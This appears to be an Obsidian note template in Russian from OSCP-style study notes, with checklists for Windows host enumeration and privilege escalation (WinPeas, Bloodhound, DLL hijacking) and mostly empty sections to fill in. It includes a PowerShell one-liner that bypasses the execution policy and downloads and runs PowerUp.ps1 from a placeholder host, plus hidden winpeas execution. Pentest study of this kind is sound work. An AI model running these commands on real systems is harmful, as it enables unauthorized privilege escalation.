---
icon: 🗒
target:
- ""
createdAt: "2025-02-09"
imageNameKey: nota_local_machine_enum_for_maria
tags: 
NoteRel:
---
## Чек-лист эндоументирования локального компьютера
- [ ] Имя пользователя, хост-имя и привилегии
- [ ] Участие в группах текущего пользователя
- [ ] Существующие пользователи и группы
- [ ] Операционная система, версия, архитектура и обновления безопасности
- [ ] Информация о сети
- [ ] Установленные приложения x64 и x86
- [ ] Работающие процессы
- [ ] Поиск чувствительных файлов
- [ ] История и трансакции PowerShell
- [ ] Переменные окружения PowerShell
- [ ] Регулярные задачи
- [ ] Работающие сервисы

## Чек-лист привилегий
- [ ] Уязвимости установленного программного обеспечения
- [ ] Регулярные задачи
- [ ] Работающие сервисы
- [ ] WinPeas
- [ ] Bloodhound
- [ ] DLL Hijacking
- [ ] winlogon
- [ ] putty

## Ссылки
[Windows Privilege Escalation – Situation Awareness](obsidian://open?vault=OSCP-Study-Notes&file=Windows%20Privilege%20Escalation%2FSituational%20Awareness)
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#windows-version-and-configuration

## Первоначальное выполнение – автоматизированные инструменты

### Winpeas
> cmd
```cmd
wmic process call create "cmd.exe /c C:\temp\winpeas.exe > C:\temp\winpeas.txt"
```

>powershell
```powershell
Start-Process -FilePath "C:\temp\winpeas.exe" -ArgumentList " > C:\temp\output.txt" -WindowStyle Hidden -NoNewWindow
```

### Powerup
```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://x.x.x.x/wintools/PowerUp.ps1'); Invoke-AllChecks"
```

# Эндоументирование для (ИМЯ ПОЛЬЩЕКА)
## хост-имя и имя пользователя
```js


```

## Привилегии пользователя
```


```

## Участие в группах
```js



```

## Чувствительные файлы по пользователю и группе
```

```

```

```

## История и трансакции PowerShell
```js


```

## Переменные окружения PowerShell
```js


```

## Find-LocalAdmins
```

```

## Работающие сервисы
- Найти сервисы, для которых у нас есть право доступа к исполняемым файлам
- Найти сервисы, находящиеся в каталогах, для которых у нас есть право доступа
- Использовать PowerUp.ps1 для автоматизации процесса и вручную выполнять метод
```

```



# Системное эндоументирование 
## Существующие пользователи и группы

### Пользователи
```js



```

### Группы
```js



```

## Операционная система, информация, версия, архитектура
```js



```

## Установленные обновления безопасности
```js



```

## Информация о сети
```js



```

```js

```
## Установленные приложения
#### Приложения x86
```js

```
#### Приложения x64
```js
   

```

## Работающие процессы
```js

```

## DLL Hijacking
- Если возможно, скачать исполняемый файл программы и локально искать уязвимые DLL.
- Найти логи программных обеспечения
- Искать название программы в интернете и выявлять известные DLL hijacking
```js
